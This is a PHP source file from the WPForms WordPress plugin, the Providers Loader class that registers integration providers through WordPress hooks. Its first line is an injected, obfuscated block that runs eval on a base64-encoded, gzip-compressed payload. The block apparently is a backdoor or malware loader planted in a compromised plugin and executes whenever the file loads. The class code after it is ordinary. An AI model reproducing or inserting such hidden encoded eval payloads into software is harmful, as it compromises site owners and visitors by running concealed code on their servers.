<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

namespace WPForms\Providers;

/**
 * Class Loader gives ability to track/load all providers.
 *
 * @package    WPForms\Providers
 * @author     WPForms
 * @since      1.4.7
 * @license    GPL-2.0+
 * @copyright  Copyright (c) 2018, WPForms LLC
 */
class Loader {

	/**
	 * Get the instance of a class and store it in itself.
	 * Later we will be able to use this class as $providers_loader = \WPForms\Providers\Loader::get_instance();
	 *
	 * @since 1.4.7
	 */
	public static function get_instance() {

		static $instance;

		if ( ! $instance ) {
			$instance = new Loader();
		}

		return $instance;
	}

	/**
	 * Loader constructor.
	 *
	 * @since 1.4.7
	 */
	public function __construct() {
	}

	/**
	 * Register a provider.
	 *
	 * @since 1.4.7
	 *
	 * @param \WPForms\Providers\Provider\Core $provider The core class of a single provider.
	 */
	public function register( Provider\Core $provider ) {

		\add_filter( 'wpforms_providers_available', array( $provider, 'register_provider' ) );

		// WPForms > Settings > Integrations page.
		$integration = $provider->get_page_integrations();
		if ( null !== $integration ) {
			\add_action( 'wpforms_settings_providers', array( $integration, 'display' ), $provider::PRIORITY, 2 );
		}

		// Editing Single Form > Form Builder.
		$form_builder = $provider->get_form_builder();
		if ( null !== $form_builder ) {
			\add_action( 'wpforms_providers_panel_sidebar', array( $form_builder, 'display_sidebar' ), $provider::PRIORITY );
			\add_action( 'wpforms_providers_panel_content', array( $form_builder, 'display_content' ), $provider::PRIORITY );
		}

		// Process entry submission.
		$process = $provider->get_process();
		if ( null !== $process ) {
			\add_action( 'wpforms_process_complete', array( $process, 'process' ), 5, 4 );
		}
	}

}
